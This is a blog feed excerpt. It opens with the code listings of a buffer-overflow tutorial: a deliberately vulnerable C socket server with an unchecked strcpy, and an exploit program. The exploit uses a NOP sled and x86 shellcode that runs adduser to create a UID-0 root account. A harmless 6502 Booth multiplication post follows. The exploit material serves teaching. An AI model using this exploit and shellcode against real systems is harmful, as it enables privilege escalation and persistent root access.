		<span class="k">if</span><span class="p">(</span><span class="n">write</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="n">run</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
		<span class="p">{</span>
			<span class="n">perror</span><span class="p">(</span><span class="s">"writing on stream socket"</span><span class="p">);</span>
			<span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
		<span class="p">}</span>
	<span class="p">}</span>
	<span class="n">close</span><span class="p">(</span><span class="n">sock</span><span class="p">);</span>
<span class="p">}</span></code></pre></figure> <h3 id="serverc">server.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;netinet/in.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
</span>
<span class="cp">#define LISTENQ 1024
#define SA struct sockaddr
#define PORT 7777
</span>
<span class="kt">void</span> <span class="nf">fc</span><span class="p">()</span> <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">name</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="s">"/bin/sh"</span><span class="p">;</span>
   <span class="n">name</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
   <span class="n">execve</span><span class="p">(</span><span class="n">name</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">name</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">buff</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
	<span class="n">strcpy</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
	<span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
	<span class="kt">char</span> <span class="n">text</span><span class="p">[</span><span class="mi">1024</span><span class="p">],</span> <span class="n">ed</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">listenfd</span><span class="p">,</span> <span class="n">connfd</span><span class="p">;</span>
	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">serveraddr</span><span class="p">;</span>
	<span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>

	<span class="k">if</span><span class="p">(</span><span class="n">argc</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">)</span>
		<span class="n">calc</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

	<span class="n">listenfd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>

	<span class="n">bzero</span><span class="p">(</span><span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">htonl</span> <span class="p">(</span><span class="n">INADDR_ANY</span><span class="p">);</span>
	<span class="n">serveraddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span> <span class="p">(</span><span class="n">PORT</span><span class="p">);</span>

	<span class="n">bind</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">serveraddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">serveraddr</span><span class="p">));</span>

	<span class="n">listen</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="n">LISTENQ</span><span class="p">);</span>
	<span class="k">for</span><span class="p">(</span> <span class="p">;</span> <span class="p">;)</span> <span class="p">{</span>

		<span class="n">connfd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">listenfd</span><span class="p">,</span> <span class="p">(</span><span class="n">SA</span> <span class="o">*</span><span class="p">)</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

		<span class="k">do</span> <span class="p">{</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Eingabe:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">text</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
			<span class="n">text</span><span class="p">[</span><span class="n">n</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

			<span class="n">calc</span><span class="p">(</span><span class="n">text</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">Gedreht:</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
			<span class="n">write</span><span class="p">(</span><span class="n">connfd</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">text</span><span class="p">));</span>

			<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">%d</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
			<span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="n">text</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">!=</span> <span class="sc">'!'</span><span class="p">);</span>

		<span class="n">close</span><span class="p">(</span><span class="n">connfd</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure> <h3 id="exploitc">exploit.c</h3> <figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define DEFAULT_OFFSET  500
#define DEFAULT_BUFFER  600
#define NOP             0x90
</span>
<span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>
    <span class="s">"</span><span class="se">\xeb\x67\x5e\x89\x76\x4c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x12\x89\x46\x50\x8d\x46\x15\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x54\x8d\x46\x17\x89\x46\x58</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x1a\x89\x46\x5c\x8d\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x1d\x89\x46\x60\x8d\x46\x22\x89</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x64\x8d\x46\x25\x89\x46\x68</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x8d\x46\x48\x89\x46\x6c\x31\xc0</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x11\x88\x46\x14\x88\x46</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x16\x88\x46\x19\x88\x46\x1c\x88</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x46\x21\x88\x46\x24\x88\x46\x47</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x88\x46\x4b\x89\x46\x70\xb0\x0b</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x89\xf3\x8d\x4e\x4c\x8d\x56\x70</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\xcd\x80\x31\xdb\x89\xd8\x40\xcd</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x80\xe8\x94\xff\xff\xff\x2f\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x73\x72\x2f\x73\x62\x69\x6e\x2f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x61\x64\x64\x75\x73\x65\x72\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x75\x23\x30\x23\x2d\x6f\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x67\x23\x72\x6f\x6f\x74\x23</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x2d\x70\x23\x24\x31\x24\x37\xcf</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x76\xd9\x4c\x4b\xcf\xb5\x24\x67</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x53\x55\x4b\x47\x36\x52\x41\x4c</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x7a\x52\x41\x38\x72\x79\x52\x4f</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x63\x54\x73\x47\x30\x23\x72\x75</span><span class="s">"</span>
    <span class="s">"</span><span class="se">\x74\x23</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">getESP</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">"movl %esp,%eax"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">calc</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">bb</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">bb</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
    <span class="n">i</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">buff</span><span class="p">,</span> <span class="o">*</span><span class="n">tmp</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="n">DEFAULT_OFFSET</span><span class="p">,</span> <span class="n">buffs</span> <span class="o">=</span> <span class="n">DEFAULT_BUFFER</span><span class="p">,</span> <span class="n">i</span><span class="p">;</span>
    <span class="kt">long</span> <span class="n">adr</span><span class="p">,</span> <span class="o">*</span><span class="n">adr_pointer</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">)</span>
        <span class="n">offset</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">&gt;</span> <span class="mi">2</span><span class="p">)</span>
        <span class="n">buffs</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>

    <span class="n">buff</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">buffs</span><span class="p">);</span>    <span class="c1">// Reserve memory on the heap</span>

    <span class="n">adr</span> <span class="o">=</span> <span class="n">getESP</span><span class="p">()</span> <span class="o">-</span> <span class="n">offset</span><span class="p">;</span>
    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span><span class="p">;</span>
    <span class="n">adr_pointer</span> <span class="o">=</span> <span class="p">(</span><span class="kt">long</span><span class="o">*</span><span class="p">)</span> <span class="n">tmp</span><span class="p">;</span>

    <span class="c1">// Fill the entire buffer with the guessed address</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">buffs</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">adr_pointer</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">adr</span><span class="p">;</span>

    <span class="c1">// Fill the first half with NOPs</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="n">buff</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">NOP</span><span class="p">;</span>

    <span class="n">tmp</span> <span class="o">=</span> <span class="n">buff</span> <span class="o">+</span> <span class="p">((</span><span class="n">buffs</span> <span class="o">/</span> <span class="mi">2</span><span class="p">)</span> <span class="o">-</span> <span class="p">(</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">));</span>
    <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
        <span class="o">*</span><span class="p">(</span><span class="n">tmp</span><span class="o">++</span><span class="p">)</span> <span class="o">=</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>

    <span class="n">buff</span><span class="p">[</span><span class="n">buffs</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">'\0'</span><span class="p">;</span>

    <span class="cm">/*calc(buff);*/</span>

    <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">buff</span><span class="p">);</span>
    <span class="n">fflush</span><span class="p">(</span><span class="n">stdout</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>]]></content><author><name></name></author><summary type="html"><![CDATA[This blog post explores the fundamentals of buffer overflows, including how they arise in C and C++ programs, the role of process memory layout and the x86/IA-32 architecture, and the significance of stack frames. It covers common overflow types ‚Äî stack-based, off-by-one, BSS, and heap ‚Äî and shows how attackers use techniques like NOP-sledding to gain elevated privileges. Finally, it illustrates how to craft a working exploit by injecting shellcode into a vulnerable application‚Äôs memory space.]]></summary></entry><entry><title type="html">A short Implementation of Booth‚Äôs Multiplication Algorithm in 6502 Assembly</title><link href="https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler/" rel="alternate" type="text/html" title="A short Implementation of Booth‚Äôs Multiplication Algorithm in 6502 Assembly"/><published>2024-12-16T04:16:00+00:00</published><updated>2024-12-16T04:16:00+00:00</updated><id>https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler</id><content type="html" xml:base="https://markusthill.github.io/blog/2024/an-efficient-implementation-of-the-booth-algorithm-in-6502-assembler/"><![CDATA[<p>Some time ago, I had to implement a multiplication routine in 6502 assembly for two integer factors, each one byte in size, using Booth‚Äôs multiplication algorithm. Implementing Booth‚Äôs method itself was not particularly tricky. However, it took me some time to come up with a solution that requires only around 40 lines of code.</p> <p>I also found it important to write a routine that tests the multiplication with various predefined combinations of the two factors. The tests included all edge cases, as well as cases where at least one of the factors is zero.</p> <p>The code was also benchmarked <a href="https://github.com/TobyLobster/multiply_test">here</a>. As it turns out, it is not terribly fast (depending on the benchmark, Booth‚Äôs algorithm does not always leverage its advantages), but it requires only 49 bytes of memory.</p> <p>The code I ended up with is listed below:</p> <figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="c1">; A little bit shorter version of the program can be created, when using a temporary variable</span>
<span class="c1">; instead of the X-Register.</span>
<span class="nf">.ORG</span> <span class="kc">$</span><span class="mi">4000</span>
<span class="nl">main:</span>
<span class="nf">CLV</span>
<span class="nf">JSR</span> <span class="nv">bMult</span>	<span class="c1">; Perform multiplication A*B with the booth-method.</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Load higher-Byte of result to Accumulator.</span>
<span class="nf">LDX</span> <span class="nv">R</span>		<span class="c1">; Load lower-Byte of result to X-Register</span>
<span class="nf">RTS</span>		<span class="c1">; Stop program.</span>


<span class="nl">bMult:</span>	<span class="nf">LDA</span> <span class="nv">A</span>	<span class="c1">; Load first operand.</span>
<span class="nf">BEQ</span> <span class="nv">bMultE</span>	<span class="c1">; stop if first operand is 0.</span>
<span class="nf">STA</span> <span class="nv">R</span>		<span class="c1">; store in lower byte of result. Will be shifted out of it later.</span>
<span class="nf">ASL</span>		<span class="c1">; Determine positions where additions or subtractions have to</span>
<span class="nf">EOR</span> <span class="nv">A</span>		<span class="c1">; be performed by using XOR. For every 1 in the X-Register a</span>
<span class="nf">TAX</span>		<span class="c1">; addition or subtraction has to be performed!</span>
<span class="nf">LDY</span> <span class="err">#</span><span class="mi">8</span>		<span class="c1">; Loop-Counter</span>
<span class="nl">bLoop:</span> <span class="nf">BVS</span> <span class="nv">bOvflw</span> <span class="c1">; If B=$80 we get an overflow for the first subtraction, ignore sign!</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Roll Result to the right. Remember that A is in the lower Byte,</span>
<span class="nf">ASL</span>		<span class="c1">; by shifting the next A-Bit into the carry flag we can determine</span>
<span class="nl">bOvflw:</span>	<span class="nf">ROR</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>	<span class="c1">; later, what operation has to be performed (Addition or subtration);</span>
<span class="nf">ROR</span> <span class="nv">R</span>		<span class="c1">; The Carry-Flag first has to be saved to the stack, because it will</span>
<span class="nf">PHP</span>		<span class="c1">; be changed in the following lines. [*(1)]</span>
<span class="nf">TXA</span>		<span class="c1">; Shift X-Register to the right. By doing this we can check if any</span>
<span class="nf">LSR</span>		<span class="c1">; operation has to be performed (Addition/Subtraction). This is the</span>
<span class="nf">TAX</span>		<span class="c1">; case if the Carry-Flag is equal to 1.</span>
<span class="nf">PLA</span>		<span class="c1">; Restore Status-Register from *(1) to Accumulator.</span>
<span class="nf">BCC</span> <span class="nb">bL</span><span class="nv">oopE</span>	<span class="c1">; Branch if no addition/subtraction has to be done...</span>
<span class="nf">LSR</span>		<span class="c1">; By shifting accumulator we get the old Carry-Flag from (*1).</span>
<span class="nf">LDA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>		<span class="c1">; Load result</span>
<span class="nf">BCC</span> <span class="nv">bAdd</span>	<span class="c1">; We can now decide if we have to add or subtract. Branch if we add.</span>
<span class="nf">SBC</span> <span class="nv">B</span>		<span class="c1">; Do a subtraction. We do not have to set the Carry-flag explicitly,</span>
<span class="nf">JMP</span> <span class="nv">bCont</span>	<span class="c1">; because we are sure the C-Flag is already set (based on the branch).</span>
<span class="nl">bAdd:</span> <span class="nf">ADC</span> <span class="nv">B</span>	<span class="c1">; Perform an addition. We do not have to reset the Carry-flag		</span>
<span class="nl">bCont:</span> <span class="nf">STA</span> <span class="nv">R</span><span class="o">+</span><span class="mi">1</span>	<span class="c1">; Store result of addition/subtraction.</span>
<span class="nl">bLoopE:</span> <span class="nf">DEY</span>	<span class="c1">; Decrement loop-counter.</span>
<span class="nf">BPL</span> <span class="nb">bL</span><span class="nv">oop</span>       <span class="c1">; Do loop exactly 8 times.</span>
<span class="nl">bMultE:</span> <span class="nf">RTS</span>	<span class="c1">; leave this subroutine. The result is in the variable R.</span>

<span class="nf">.ORG</span> <span class="kc">$</span><span class="mi">4500</span>
<span class="nl">A:</span> <span class="nf">.BYTE</span> <span class="kc">$</span><span class="nv">AA</span>	<span class="c1">; First factor. 1 Byte.</span>
<span class="nl">B:</span> <span class="nf">.BYTE</span> <span class="kc">$</span><span class="mi">81</span>	<span class="c1">; Second factor. 1 Byte.</span>
<span class="nl">R:</span> <span class="nf">.WORD</span> <span class="kc">$</span><span class="mi">0000</span>	<span class="c1">; The result. Needs two bytes.</span></code></pre></figure> <p>In one of the following posts I will describe the ideas behind the Booth method in more detail.</p>]]></content><author><name></name></author><category term="Assembly 6502 Booth Multiplication"/><summary type="html"><![CDATA[I implemented a 6502 assembly routine for multiplying two one-byte integers using Booth's algorithm. While the algorithm itself wasn't difficult to implement, it took time to create a solution that fit within 40 lines of code. I also wrote a test routine to verify the multiplication, covering various predefined combinations, edge cases, and scenarios where one factor is zero.]]></summary></entry></feed>